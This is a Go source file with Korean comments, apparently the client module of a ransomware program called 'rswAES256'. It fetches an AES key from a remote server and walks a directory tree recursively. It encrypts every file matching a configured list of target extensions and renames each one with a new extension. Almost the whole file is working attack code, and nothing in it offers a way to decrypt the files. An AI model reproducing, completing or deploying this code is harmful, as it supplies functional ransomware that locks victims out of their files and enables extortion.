package client

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"rswAES256/encrypt"
	"strings"
)

// GetKey 는 서버로부터 키를 가져온다.
func (c *Client) GetKey() (*string, error) {
	res, err := http.Get(c.config.Network.Uri)
	if err != nil {
		log.Println(err)
		return nil, err
	}

	// body 닫기
	defer func(Body io.ReadCloser) {
		err = Body.Close()
		if err != nil {
			log.Println("Error closing response body:", err)
		}
	}(res.Body)

	// body 읽어옴
	body, err := io.ReadAll(res.Body)
	if err != nil {
		log.Println(err)
		return nil, err
	}

	// body에 있는 데이터를 client에 넣어줌.
	err = json.Unmarshal(body, &c)
	if err != nil {
		log.Println(err)
		return nil, err
	}

	return &c.Key, nil
}

// AESEncryptDirectory 는 전달한 root 경로부터 하위 폴더까지 탐색하면서 파일을 암호화 합니다.
func (c *Client) AESEncryptDirectory(rootPath string) error {

	// filepath.Walk 함수에 디렉토리 경로와 콜백 함수를 전달합니다.
	err := filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			// 파일 또는 디렉토리에 접근하는 중 에러가 발생한 경우 처리
			fmt.Printf("error accessing %s: %v\n", path, err)
			return err
		} else {
			for _, extension := range c.config.Extensions.Targets {
				// 등록된 target 확장자인지 체크.
				if strings.Contains(info.Name(), extension) {
					//fmt.Printf("Path: %s, IsDir: %v, Name: %v\n", path, info.IsDir(), info.Name())
					// 파일을 암호화
					if err = encrypt.EncryptFile(path, []byte(c.Key)); err != nil {
						log.Printf("error encrypting %s: %v\n", path, err)
						return err
					} else { // 암호화 성공시 확장자 변경
						if err = c.ChangeFileExtension(path); err != nil {
							log.Printf("error changing %s: %v\n", path, err)
							return err
						}
						fmt.Println(path, "에 대해 암호화를 성공하였습니다.")
						fmt.Println(path, "에 대해 .", c.config.Extensions.NewExt, "로 확장자 변경을 성공하였습니다.")
						break
					}
				}
			}
		}
		return nil
	})

	// 순회 중 에러가 발생한 경우 출력합니다.
	if err != nil {
		log.Printf("error walking the path %q: %v\n", rootPath, err)
		return err
	}
	return nil
}

// ChangeFileExtension 는 파일 확장자를 변경합니다.
func (c *Client) ChangeFileExtension(filePath string) error {
	// 디렉토리 경로 분리
	dir := filepath.Dir(filePath)
	// 파일 이름 분리
	fileName := filepath.Base(filePath)

	// "." 체크
	if !strings.HasPrefix(c.config.Extensions.NewExt, ".") {
		fileName += "."
	}
	// 파일 이름에 새로운 확장자 추가
	fileName += c.config.Extensions.NewExt

	// 새로운 전체 경로 생성.
	newPath := filepath.Join(dir, fileName)

	// 새로운 확장자로 파일 이름을 변경.
	err := os.Rename(filePath, newPath)
	if err != nil {
		return fmt.Errorf("파일 이름 변경 실패: %v", err)
	}

	return nil
}
